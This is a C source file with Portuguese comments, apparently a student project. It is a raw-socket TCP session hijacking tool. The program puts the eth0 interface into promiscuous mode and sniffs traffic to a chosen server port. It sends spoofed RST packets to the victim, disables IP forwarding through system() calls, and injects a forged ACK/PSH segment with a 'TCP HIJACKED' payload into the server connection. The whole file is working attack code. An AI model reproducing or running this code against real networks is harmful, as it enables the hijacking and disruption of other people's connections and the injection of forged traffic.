#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/ether.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/filter.h>
#include <net/if.h>
#include <string.h>
#include <sys/time.h>
#include <signal.h>

/* tamanho de um endereco mac */
#define MAC_ADDR_LEN 6
/* tamanho máximo de um frame Ethernet*/
#define BUFFER_SIZE 1518
/* ip header offset no buffer_in de entrada */
#define IP_OFFSET 14
/* tcp header offset no buffer_in de entrada - Se nao houver IP OPTIONS */
#define TCP_OFFSET IP_OFFSET+20

#define ETHER_TYPE	0x0800

unsigned short in_cksum( unsigned short *addr, int len );
unsigned short trans_check(unsigned char proto, char *packet, int length, struct in_addr source_address, struct in_addr dest_address);

int main(int argc, char *argv[]){
	int fd;
	struct ifreq ethreq, if_mac, if_idx;
	struct sockaddr_ll socket_address;
	char mac_dst[6] = {0xf};
	char mac_src[6] = {0xf};
	char mac_gtw[6] = {0xf};
	short int ethertype = htons(0x0800);
	int i, j, size, packet_size;
	int frame_len = 0;
	int num_envios = 0;
	unsigned char buffer_in[BUFFER_SIZE];
	unsigned char buffer_out[BUFFER_SIZE];
	unsigned char ip_prot = 0;
	unsigned char ip_dst[4] = {0};
	unsigned char ip_src[4] = {0};
	unsigned short port_dst = 0;
	unsigned short port_src = 0;
	unsigned short last_port_dst = 0;
	unsigned short last_port_src = 0;
	unsigned short port_vitima = 0;
	unsigned short port_server = 0;
	unsigned int ack = 0;
	unsigned int seq = 0;
	unsigned int last_ack = 0;
	unsigned int last_seq = 0;

	char packet[BUFFER_SIZE];
	struct ether_header *eh = (struct ether_header *) packet;
	struct ip *iphdr = (struct ip *) (packet + sizeof(struct ether_header));
	struct tcphdr *tcp = (struct tcphdr *) (packet + sizeof(struct ether_header) + sizeof(struct iphdr));

	struct ether_header *eh_out = (struct ether_header *) buffer_out;
	struct ip *iphdr_out = (struct ip *) (buffer_out + sizeof(struct ether_header));
	struct tcphdr *tcp_out = (struct tcphdr *) (buffer_out + sizeof(struct ether_header) + sizeof(struct iphdr));
	const char payload[] = {"TCP HIJACKED !!!! X_x"};

	char buffer_ack[BUFFER_SIZE];
	struct ether_header *eh_ack = (struct ether_header *) buffer_ack;
	struct ip *iphdr_ack = (struct ip *) (buffer_ack + sizeof(struct ether_header));
	struct tcphdr *tcp_ack = (struct tcphdr *) (buffer_ack + sizeof(struct ether_header) + sizeof(struct iphdr));



	if (argc != 8) {
		fprintf(stderr,"usage: %s <port> <gateway mac address>\n", argv[0]);
		exit(0);
	}

	port_server = atoi(argv[1]);
	unsigned long int ret = 0;
	for(i=0;i<6;i++) {
		ret = (unsigned long int)strtol(argv[i+2], NULL, 16);
		mac_gtw[i] = (unsigned char)ret;
	}

	/* Cria o Socket Raw */
	if ((fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
		perror("socket:");
		return -1;
	}

	/* Coloca o adaptador de rede em modo promíscuo */
	strncpy(ethreq.ifr_name, "eth0", IFNAMSIZ);
	if (ioctl(fd,SIOCGIFFLAGS, &ethreq) == -1) {
		perror("ioctl");
		close(fd);
		exit(-1);
	}

	ethreq.ifr_flags |= IFF_PROMISC;
	if (ioctl(fd, SIOCSIFFLAGS, &ethreq) == -1) {
		perror("ioctl");
		close(fd);
		exit(-1);
	}

	/* Obtem o endereco MAC da interface local */
	memset(&if_mac, 0, sizeof (struct ifreq));
	strncpy(if_mac.ifr_name, "eth0", IFNAMSIZ - 1);
	if (ioctl(fd, SIOCGIFHWADDR, &if_mac) < 0) {
		perror("SIOCGIFHWADDR");
		exit(1);
	}

	/* Obtem o indice da interface de rede */
	memset(&if_idx, 0, sizeof (struct ifreq));
	strncpy(if_idx.ifr_name, "eth0", IFNAMSIZ - 1);
	if (ioctl(fd, SIOCGIFINDEX, &if_idx) < 0) {
		perror("SIOCGIFINDEX");
		exit(1);
	}

	socket_address.sll_ifindex = if_idx.ifr_ifindex;
	socket_address.sll_halen = ETH_ALEN;

	memset(packet,0,BUFFER_SIZE);
	eh->ether_shost[0] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[0];
	eh->ether_shost[1] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[1];
	eh->ether_shost[2] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[2];
	eh->ether_shost[3] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[3];
	eh->ether_shost[4] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[4];
	eh->ether_shost[5] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[5];
	eh->ether_type = htons(0x0800);
	memset(buffer_out,0,BUFFER_SIZE);
	eh_out->ether_shost[0] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[0];
	eh_out->ether_shost[1] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[1];
	eh_out->ether_shost[2] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[2];
	eh_out->ether_shost[3] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[3];
	eh_out->ether_shost[4] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[4];
	eh_out->ether_shost[5] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[5];
	eh_out->ether_type = htons(0x0800);
	memset(buffer_ack,0,BUFFER_SIZE);
	eh_ack->ether_shost[0] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[0];
	eh_ack->ether_shost[1] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[1];
	eh_ack->ether_shost[2] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[2];
	eh_ack->ether_shost[3] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[3];
	eh_ack->ether_shost[4] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[4];
	eh_ack->ether_shost[5] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[5];
	eh_ack->ether_type = htons(0x0800);

	 while ((size = read(fd, buffer_in, BUFFER_SIZE)) > 0 && num_envios <= 2){
	 		ip_prot = buffer_in[IP_OFFSET+9];

			if( ip_prot == 0x06 ) {		// TCP
				if(buffer_in[12] == 0x08 && buffer_in[13] == 0x00) {
					for(i=0;i<6;i++) {
						mac_src[i] = buffer_in[i];
					}
					for(i=6;i<12;i++) {
						mac_dst[i-6] = buffer_in[i];
					}
					for (i = IP_OFFSET+12; i < IP_OFFSET+16; i++){
						ip_dst[i-(IP_OFFSET+12)] = buffer_in[i];
					}
					for (i = IP_OFFSET+16; i < IP_OFFSET+20; i++) {
						ip_src[i-(IP_OFFSET+16)] = buffer_in[i];
					}
					port_src = buffer_in[TCP_OFFSET]<<8 | buffer_in[TCP_OFFSET+1];
					port_dst = buffer_in[TCP_OFFSET+2]<<8 | buffer_in[TCP_OFFSET+3];
					seq = buffer_in[TCP_OFFSET+4]<<24 | buffer_in[TCP_OFFSET+5]<<16 | buffer_in[TCP_OFFSET+6]<<8 | buffer_in[TCP_OFFSET+7];
					ack = buffer_in[TCP_OFFSET+8]<<24 | buffer_in[TCP_OFFSET+9]<<16 | buffer_in[TCP_OFFSET+10]<<8 | buffer_in[TCP_OFFSET+11];

					// printf("\n port_dst %d, port_server %d\n", port_dst, port_server);
					if( port_dst == port_server ) {
						eh->ether_dhost[0] = mac_dst[0]; //MAC source
						eh->ether_dhost[1] = mac_dst[1];
				    eh->ether_dhost[2] = mac_dst[2];
				    eh->ether_dhost[3] = mac_dst[3];
				    eh->ether_dhost[4] = mac_dst[4];
				    eh->ether_dhost[5] = mac_dst[5];
						socket_address.sll_addr[0] = mac_dst[0];
				    socket_address.sll_addr[1] = mac_dst[1];
				    socket_address.sll_addr[2] = mac_dst[2];
				    socket_address.sll_addr[3] = mac_dst[3];
				    socket_address.sll_addr[4] = mac_dst[4];
				    socket_address.sll_addr[5] = mac_dst[5];
	          frame_len += sizeof(struct ether_header);

						packet_size = (sizeof(struct ip) + sizeof(struct tcphdr));
						iphdr->ip_v = 4;
						iphdr->ip_hl = 5;
						iphdr->ip_len = htons(packet_size);
						iphdr->ip_off = 0;
						iphdr->ip_ttl = IPDEFTTL;
						iphdr->ip_p = IPPROTO_TCP;
						iphdr->ip_src.s_addr = ip_src[3]<<24 | ip_src[2]<<16 | ip_src[1]<<8 | ip_src[0];
						iphdr->ip_dst.s_addr = ip_dst[3]<<24 | ip_dst[2]<<16 | ip_dst[1]<<8 | ip_dst[0];
						iphdr->ip_sum = (unsigned short)in_cksum((unsigned short *)iphdr, sizeof(struct ip));
						frame_len += sizeof(struct ip);

	        	tcp->th_dport = htons(port_src);
		        tcp->th_sport = htons(port_server);
		        tcp->th_seq = htonl(ack);
						tcp->th_ack = 0;
	          tcp->th_off = 5;
						tcp->th_flags = TH_RST | TH_PUSH;
		        tcp->th_win = htons(1200);
		       	tcp->th_sum = trans_check(IPPROTO_TCP, packet, sizeof(struct tcphdr), iphdr->ip_src, iphdr->ip_dst);
						frame_len += sizeof(struct tcphdr);

						/* Garante que nao enviamos para o server
						** (port_src deve ser o da vitima, ja que so "interceptamos" pacotes destinados ao server...) */
						system("echo 0 > /proc/sys/net/ipv4/ip_forward"); // Bloqueia possiveis pacotes de reset do cliente
						if( tcp->th_dport == htons(port_src) ) {
							if (num_envios > 1 ) {
								if (sendto(fd, packet, frame_len, 0, (struct sockaddr *) &socket_address, sizeof (struct sockaddr_ll)) < 0) {
									perror("send"); close(fd); exit(1); }
							}
							last_port_src = port_src;
							last_port_dst = port_dst;
							last_ack = ack;
							last_seq = seq;
							port_src = 0;
							port_dst = 0;
							ack = 0;
							seq = 0;
	            frame_len = 0;
							num_envios++;
							// printf("\n Numero Envios %d\n", num_envios);
							system("echo 0 > /proc/sys/net/ipv4/ip_forward"); // Bloqueia possiveis pacotes de reset do cliente
							// sleep(4);
						}
					}
				}
			}
	}
	printf("\n Out of the loop\n");
	// Enviar algum pacote ao server
	frame_len = 0;
	eh_out->ether_dhost[0] = mac_gtw[0];
	eh_out->ether_dhost[1] = mac_gtw[1];
	eh_out->ether_dhost[2] = mac_gtw[2];
	eh_out->ether_dhost[3] = mac_gtw[3];
	eh_out->ether_dhost[4] = mac_gtw[4];
	eh_out->ether_dhost[5] = mac_gtw[5];
	socket_address.sll_addr[0] = mac_gtw[0];
	socket_address.sll_addr[1] = mac_gtw[1];
	socket_address.sll_addr[2] = mac_gtw[2];
	socket_address.sll_addr[3] = mac_gtw[3];
	socket_address.sll_addr[4] = mac_gtw[4];
	socket_address.sll_addr[5] = mac_gtw[5];
	frame_len += sizeof(struct ether_header);

	iphdr_out->ip_v = 4;
	iphdr_out->ip_hl = 5;
	packet_size = (sizeof(struct ip) + sizeof(struct tcphdr) + sizeof(payload));
	iphdr_out->ip_len = htons(packet_size);
	iphdr_out->ip_off = 0;
	iphdr_out->ip_ttl = IPDEFTTL;
	iphdr_out->ip_p = IPPROTO_TCP;
	iphdr_out->ip_dst.s_addr = ip_src[3]<<24 | ip_src[2]<<16 | ip_src[1]<<8 | ip_src[0];
	iphdr_out->ip_src.s_addr = ip_dst[3]<<24 | ip_dst[2]<<16 | ip_dst[1]<<8 | ip_dst[0];
	iphdr_out->ip_sum = (unsigned short)in_cksum((unsigned short *)iphdr_out, sizeof(struct ip));
	frame_len += sizeof(struct ip);
	tcp_out->th_dport = htons(port_server);
	tcp_out->th_sport = htons(last_port_src);
	tcp_out->th_seq = htonl(last_seq);
	tcp_out->th_ack = htonl(last_ack);
	tcp_out->th_off = 5;
	tcp_out->th_flags = TH_ACK | TH_PUSH;
	tcp_out->th_win = htons(1200);
	frame_len += sizeof(struct tcphdr);
	memcpy(&buffer_out[frame_len], payload, sizeof(payload));
	tcp_out->th_sum = trans_check(IPPROTO_TCP, buffer_out, (sizeof(struct tcphdr)+sizeof(payload)), iphdr->ip_src, iphdr->ip_dst);
	frame_len += sizeof(payload);
	if (sendto(fd, buffer_out, frame_len, 0, (struct sockaddr *) &socket_address, sizeof (struct sockaddr_ll)) < 0) {
		perror("send");
		close(fd);
		exit(1);
	}
	//USAR OUTRO BUFFER
	frame_len = 0;
	eh_ack->ether_dhost[0] = mac_gtw[0];
	eh_ack->ether_dhost[1] = mac_gtw[1];
	eh_ack->ether_dhost[2] = mac_gtw[2];
	eh_ack->ether_dhost[3] = mac_gtw[3];
	eh_ack->ether_dhost[4] = mac_gtw[4];
	eh_ack->ether_dhost[5] = mac_gtw[5];
	socket_address.sll_addr[0] = mac_gtw[0];
	socket_address.sll_addr[1] = mac_gtw[1];
	socket_address.sll_addr[2] = mac_gtw[2];
	socket_address.sll_addr[3] = mac_gtw[3];
	socket_address.sll_addr[4] = mac_gtw[4];
	socket_address.sll_addr[5] = mac_gtw[5];
	frame_len += sizeof(struct ether_header);
	iphdr_ack->ip_v = 4;
	iphdr_ack->ip_hl = 5;
	iphdr_ack->ip_off = 0;
	iphdr_ack->ip_ttl = IPDEFTTL;
	iphdr_ack->ip_p = IPPROTO_TCP;
	iphdr_ack->ip_dst.s_addr = ip_src[3]<<24 | ip_src[2]<<16 | ip_src[1]<<8 | ip_src[0];
	iphdr_ack->ip_src.s_addr = ip_dst[3]<<24 | ip_dst[2]<<16 | ip_dst[1]<<8 | ip_dst[0];
	packet_size = (sizeof(struct ip) + sizeof(struct tcphdr));
	iphdr_ack->ip_len = htons(packet_size);
	iphdr_ack->ip_sum = (unsigned short)in_cksum((unsigned short *)iphdr_ack, sizeof(struct ip));
	frame_len += sizeof(struct ip);
	tcp_ack->th_dport = htons(port_server);
	tcp_ack->th_sport = htons(last_port_src);
	tcp_ack->th_off = 5;
	tcp_ack->th_flags = TH_ACK;
	tcp_ack->th_win = htons(1200);
	frame_len += sizeof(struct tcphdr);


	// Send an ACK to the server response (changing only a few fields)
	while ((size = read(fd, buffer_in, BUFFER_SIZE)) > 0){
		 ip_prot = buffer_in[IP_OFFSET+9];
		 if ( ip_prot == 0x06 ) {
			 seq = buffer_in[TCP_OFFSET+4]<<24 | buffer_in[TCP_OFFSET+5]<<16 | buffer_in[TCP_OFFSET+6]<<8 | buffer_in[TCP_OFFSET+7];
			 ack = buffer_in[TCP_OFFSET+8]<<24 | buffer_in[TCP_OFFSET+9]<<16 | buffer_in[TCP_OFFSET+10]<<8 | buffer_in[TCP_OFFSET+11];
		 	 tcp_ack->th_seq = htonl(ack);
		 	 tcp_ack->th_ack = htonl(seq + sizeof(payload));
			 tcp_ack->th_sum = trans_check(IPPROTO_TCP, buffer_ack, sizeof(struct tcphdr), iphdr_ack->ip_src, iphdr_ack->ip_dst);
			 if (sendto(fd, buffer_ack, frame_len, 0, (struct sockaddr *) &socket_address, sizeof (struct sockaddr_ll)) < 0) {
		 		perror("send");
		 		close(fd);
		 		exit(1);
		 	 }
			 break;
		 }
	 }
	return 0;
}

/*
** in_cksum
** from http://www.linuxquestions.org/questions/programming-9/raw-sockets-checksum-function-56901/
*/
unsigned short in_cksum(unsigned short *addr,int len) {
    register int sum = 0;
    u_short answer = 0;
    register u_short *w = addr;
    register int nleft = len;
    while (nleft > 1)  {
	    sum += *w++;
	    nleft -= 2;
		}
    if (nleft == 1) {
	    *(u_char *)(&answer) = *(u_char *)w ;
	    sum += answer;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    return(answer);
}

/*
** trans_check
** from http://www.linuxquestions.org/questions/programming-9/raw-sockets-checksum-function-56901/
*/
unsigned short trans_check(unsigned char proto, char *packet, int length, struct in_addr source_address,struct in_addr dest_address) {
  struct psuedohdr  {
  	struct in_addr source_address;
  	struct in_addr dest_address;
  	unsigned char place_holder;
  	unsigned char protocol;
  	unsigned short length;
  } psuedohdr;
  char *psuedo_packet;
  unsigned short answer;
  psuedohdr.protocol = proto;
  psuedohdr.length = htons(length);
  psuedohdr.place_holder = 0;
	psuedohdr.source_address = source_address;
  psuedohdr.dest_address = dest_address;
  if((psuedo_packet = malloc(sizeof(psuedohdr) + length)) == NULL)  {
    perror("malloc");
    exit(1);
  }
  memcpy(psuedo_packet,&psuedohdr,sizeof(psuedohdr));
  memcpy((psuedo_packet + sizeof(psuedohdr)),packet,length);
  answer = (unsigned short)in_cksum((unsigned short *)psuedo_packet,(length + sizeof(psuedohdr)));
  free(psuedo_packet);
  return answer;
}
